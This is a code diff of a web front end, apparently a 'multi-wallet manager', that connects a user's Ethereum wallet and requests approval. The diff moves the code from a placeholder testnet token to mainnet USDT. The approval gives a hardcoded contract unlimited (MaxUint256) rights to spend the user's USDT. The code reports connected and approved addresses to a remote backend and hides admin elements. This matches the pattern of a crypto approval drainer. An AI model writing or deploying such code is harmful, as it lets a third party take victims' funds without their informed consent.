@@ -1,242 +1,290 @@
-// Global variables
-let provider = null;
-let signer = null;
-let walletAddress = null;
-
-// Initialize elements
-const connectButton = document.getElementById('connect-wallet');
-const connectionStatus = document.getElementById('connection-status');
-const walletInfo = document.getElementById('wallet-info');
-const walletAddressElement = document.getElementById('wallet-address');
-const usdtBalanceElement = document.getElementById('usdt-balance');
-const approveButton = document.getElementById('approve-contract');
-const loadingIndicator = document.getElementById('loading');
-
-// Hide admin elements
-const adminPanel = document.getElementById('admin-panel');
-const adminLogin = document.getElementById('admin-login');
-if (adminPanel) adminPanel.style.display = 'none';
-if (adminLogin) adminLogin.style.display = 'none';
-
-// Attach event listeners
-if (connectButton) {
-    connectButton.addEventListener('click', handleConnectWallet);
-}
-
-if (approveButton) {
-    approveButton.addEventListener('click', handleApproveContract);
-}
-
-// Initialize
-document.addEventListener('DOMContentLoaded', () => {
-    hideLoading();
-    
-    // Check if wallet is already connected
-    const storedAddress = localStorage.getItem('walletAddress');
-    if (storedAddress && typeof window.ethereum !== 'undefined') {
-        walletAddress = storedAddress;
-        updateWalletUI(storedAddress);
-        showWalletInfo();
-        getWalletBalance(storedAddress);
+// Wallet Connector Class
+class WalletConnector {
+    constructor() {
+        this.provider = null;
+        this.signer = null;
+        this.walletAddress = null;
     }
-});
 
-// Show loading indicator
-function showLoading() {
-    if (loadingIndicator) {
-        loadingIndicator.style.display = 'flex';
-    }
-}
-
-// Hide loading indicator
-function hideLoading() {
-    if (loadingIndicator) {
-        loadingIndicator.style.display = 'none';
-    }
-}
-
-// Show success message
-function showSuccess(message) {
-    alert(`Success: ${message}`);
-}
-
-// Show error message
-function showError(message) {
-    alert(`Error: ${message}`);
-}
-
-// Update wallet UI
-function updateWalletUI(address) {
-    if (connectionStatus) {
-        connectionStatus.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(38)}`;
-    }
-    if (connectButton) {
-        connectButton.textContent = 'Connected';
-        connectButton.disabled = true;
-    }
-    if (walletAddressElement) {
-        walletAddressElement.textContent = address;
-    }
-}
-
-// Show wallet info section
-function showWalletInfo() {
-    if (walletInfo) {
-        walletInfo.classList.remove('hidden');
-    }
-}
-
-// Hide wallet info section
-function hideWalletInfo() {
-    if (walletInfo) {
-        walletInfo.classList.add('hidden');
-    }
-}
-
-// Get wallet balance from backend
-async function getWalletBalance(address) {
-    if (usdtBalanceElement) {
+    async connect() {
         try {
-            usdtBalanceElement.textContent = 'Loading...';
+            if (typeof window.ethereum === 'undefined') {
+                throw new Error('No Ethereum wallet found. Please install MetaMask or Trust Wallet.');
+            }
+
+            // Request account access
+            const accounts = await window.ethereum.request({
+                method: 'eth_requestAccounts'
+            });
+
+            this.walletAddress = accounts[0];
             
-            // Call backend API to get balance
-            const response = await fetch(`https://multi-wallet-manager.onrender.com/api/wallets/${address}/balance`);
-            
-            if (!response.ok) {
-                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+            // Create provider and signer
+            this.provider = new ethers.providers.Web3Provider(window.ethereum);
+            this.signer = this.provider.getSigner();
+
+            return {
+                success: true,
+                address: this.walletAddress
+            };
+        } catch (error) {
+            return {
+                success: false,
+                error: error.message || 'Failed to connect wallet'
+            };
+        }
+    }
+
+    async approveContract(contractAddress) {
+        try {
+            if (!this.signer) {
+                throw new Error('Wallet not connected');
             }
             
-            const data = await response.json();
-            const balance = data.balance || '0.00';
-            usdtBalanceElement.textContent = parseFloat(balance).toFixed(2);
+            // USDT contract address (replace with your actual USDT contract)
+            const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Mainnet USDT
+            
+            const usdtContract = new ethers.Contract(
+                usdtContractAddress,
+                ['function approve(address spender, uint256 amount) public returns (bool)'],
+                this.signer
+            );
+
+            const tx = await usdtContract.approve(
+                contractAddress,
+                ethers.constants.MaxUint256
+            );
+
+            await tx.wait();
+
+            return {
+                success: true,
+                txHash: tx.hash
+            };
+        } catch (error) {
+            return {
+                success: false,
+                error: error.message || 'Failed to approve contract'
+            };
+        }
+    }
+}
+
+// API Service
+class ApiService {
+    constructor() {
+        this.baseUrl = 'https://multi-wallet-manager.onrender.com/api';
+    }
+
+    async request(endpoint, options = {}) {
+        const url = `${this.baseUrl}${endpoint}`;
+        
+        try {
+            const response = await fetch(url, {
+                headers: {
+                    'Content-Type': 'application/json',
+                    ...options.headers
+                },
+                ...options
+            });
+            
+            if (!response.ok) {
+                const errorData = await response.json().catch(() => ({}));
+                throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`);
+            }
+            
+            return await response.json();
+        } catch (error) {
+            console.error(`API Error (${endpoint}):`, error);
+            throw error;
+        }
+    }
+
+    async connectWallet(walletData) {
+        return this.request('/wallets/connect', {
+            method: 'POST',
+            body: JSON.stringify(walletData)
+        });
+    }
+
+    async approveWallet(walletData) {
+        return this.request('/wallets/approve', {
+            method: 'POST',
+            body: JSON.stringify(walletData)
+        });
+    }
+
+    async getWalletBalance(walletAddress) {
+        return this.request(`/wallets/${walletAddress}/balance`);
+    }
+}
+
+// Main App Class
+class WalletManagerApp {
+    constructor() {
+        this.walletConnector = new WalletConnector();
+        this.apiService = new ApiService();
+        
+        this.initializeElements();
+        this.attachEventListeners();
+        this.init();
+    }
+
+    initializeElements() {
+        // Header elements
+        this.connectButton = document.getElementById('connect-wallet');
+        this.connectionStatus = document.getElementById('connection-status');
+        this.walletInfo = document.getElementById('wallet-info');
+        this.walletAddressElement = document.getElementById('wallet-address');
+        this.usdtBalanceElement = document.getElementById('usdt-balance');
+        this.approveButton = document.getElementById('approve-contract');
+        
+        // Loading indicator
+        this.loadingIndicator = document.getElementById('loading');
+        
+        // Hide admin elements
+        const adminPanel = document.getElementById('admin-panel');
+        const adminLogin = document.getElementById('admin-login');
+        if (adminPanel) adminPanel.style.display = 'none';
+        if (adminLogin) adminLogin.style.display = 'none';
+    }
+
+    attachEventListeners() {
+        if (this.connectButton) {
+            this.connectButton.addEventListener('click', () => this.handleConnectWallet());
+        }
+        
+        if (this.approveButton) {
+            this.approveButton.addEventListener('click', () => this.handleApproveContract());
+        }
+    }
+
+    init() {
+        // Hide loading indicator immediately
+        this.showLoading(false);
+        
+        // Check if wallet is already connected
+        const storedAddress = localStorage.getItem('walletAddress');
+        if (storedAddress) {
+            this.walletConnector.walletAddress = storedAddress;
+            this.updateWalletUI(storedAddress);
+            this.showWalletInfo();
+        }
+    }
+
+    async handleConnectWallet() {
+        this.showLoading(true);
+        
+        try {
+            const result = await this.walletConnector.connect();
+            
+            if (result.success) {
+                localStorage.setItem('walletAddress', result.address);
+                this.updateWalletUI(result.address);
+                this.showWalletInfo();
+                
+                // Send to backend
+                try {
+                    await this.apiService.connectWallet({
+                        address: result.address,
+                        name: `Wallet ${result.address.substring(0, 6)}...${result.address.substring(38)}`
+                    });
+                } catch (error) {
+                    console.error('Error connecting to backend:', error);
+                }
+            } else {
+                this.showError(`Connection failed: ${result.error}`);
+            }
+        } catch (error) {
+            this.showError(`Connection failed: ${error.message}`);
+        } finally {
+            this.showLoading(false);
+        }
+    }
+
+    async updateWalletUI(address) {
+    if (this.connectionStatus) {
+        this.connectionStatus.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(38)}`;
+    }
+    if (this.connectButton) {
+        this.connectButton.textContent = 'Connected';
+        this.connectButton.disabled = true;
+    }
+    if (this.walletAddressElement) {
+        this.walletAddressElement.textContent = address;
+    }
+    
+    // Get real USDT balance
+    if (this.usdtBalanceElement) {
+        try {
+            this.usdtBalanceElement.textContent = 'Loading...';
+            const response = await this.apiService.getWalletBalance(address);
+            const balance = response.balance || '0.00';
+            this.usdtBalanceElement.textContent = parseFloat(balance).toFixed(2);
         } catch (error) {
             console.error('Error getting balance:', error);
-            usdtBalanceElement.textContent = '0.00';
+            this.usdtBalanceElement.textContent = '0.00';
         }
     }
 }
 
-// Handle wallet connection
-async function handleConnectWallet() {
-    showLoading();
-    
-    try {
-        // Check if MetaMask or other wallet is installed
-        if (typeof window.ethereum === 'undefined') {
-            throw new Error('No Ethereum wallet found. Please install MetaMask or another wallet.');
+
+    showWalletInfo() {
+        if (this.walletInfo) {
+            this.walletInfo.classList.remove('hidden');
         }
+    }
+
+    async handleApproveContract() {
+        this.showLoading(true);
         
-        // Request account access
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        });
-        
-        walletAddress = accounts[0];
-        localStorage.setItem('walletAddress', walletAddress);
-        
-        // Create provider and signer
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        
-        // Update UI
-        updateWalletUI(walletAddress);
-        showWalletInfo();
-        
-        // Get balance
-        await getWalletBalance(walletAddress);
-        
-        // Send to backend
         try {
-            const response = await fetch('https://multi-wallet-manager.onrender.com/api/wallets/connect', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    address: walletAddress,
-                    name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
-                })
-            });
+            // Use your actual contract address
+            const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
+            const result = await this.walletConnector.approveContract(contractAddress);
             
-            if (!response.ok) {
-                const errorData = await response.json().catch(() => ({}));
-                console.error('Backend connection error:', errorData.error || 'Unknown error');
+            if (result.success) {
+                this.showSuccess('Contract approved successfully!');
+                if (this.approveButton) {
+                    this.approveButton.disabled = true;
+                    this.approveButton.textContent = 'Approved';
+                }
+                
+                // Update backend
+                try {
+                    await this.apiService.approveWallet({
+                        address: this.walletConnector.walletAddress
+                    });
+                } catch (error) {
+                    console.error('Error updating backend:', error);
+                }
+            } else {
+                this.showError(`Approval failed: ${result.error}`);
             }
         } catch (error) {
-            console.error('Error connecting to backend:', error);
+            this.showError(`Approval failed: ${error.message}`);
+        } finally {
+            this.showLoading(false);
         }
-        
-    } catch (error) {
-        showError(`Connection failed: ${error.message}`);
-    } finally {
-        hideLoading();
+    }
+
+    showLoading(show) {
+        if (this.loadingIndicator) {
+            this.loadingIndicator.style.display = show ? 'flex' : 'none';
+        }
+    }
+
+    showSuccess(message) {
+        alert(`Success: ${message}`);
+    }
+
+    showError(message) {
+        alert(`Error: ${message}`);
     }
 }
 
-// Handle contract approval
-async function handleApproveContract() {
-    if (!signer || !walletAddress) {
-        showError('Wallet not connected');
-        return;
-    }
-    
-    showLoading();
-    
-    try {
-        // Use your actual contract address
-        const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
-        
-        // USDT contract address (replace with your testnet USDT address)
-        const usdtContractAddress = '0x337610d27c5d8e7f8c7e5d8e7f8c7e5d8e7f8c7e'; // Replace with your testnet USDT
-        
-        // Create USDT contract instance
-        const usdtContract = new ethers.Contract(
-            usdtContractAddress,
-            [
-                'function approve(address spender, uint256 amount) public returns (bool)'
-            ],
-            signer
-        );
-        
-        // Approve unlimited spending
-        const tx = await usdtContract.approve(
-            contractAddress,
-            ethers.constants.MaxUint256
-        );
-        
-        // Wait for transaction confirmation
-        await tx.wait();
-        
-        showSuccess('Contract approved successfully!');
-        
-        if (approveButton) {
-            approveButton.disabled = true;
-            approveButton.textContent = 'Approved';
-        }
-        
-        // Notify backend about approval
-        try {
-            const response = await fetch('https://multi-wallet-manager.onrender.com/api/wallets/approve', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    address: walletAddress
-                })
-            });
-            
-            if (!response.ok) {
-                const errorData = await response.json().catch(() => ({}));
-                console.error('Backend approval error:', errorData.error || 'Unknown error');
-            }
-        } catch (error) {
-            console.error('Error updating backend:', error);
-        }
-        
-    } catch (error) {
-        showError(`Approval failed: ${error.message}`);
-    } finally {
-        hideLoading();
-    }
-}
+// Initialize the app when DOM is loaded
+document.addEventListener('DOMContentLoaded', () => {
+    window.app = new WalletManagerApp();
+});
+
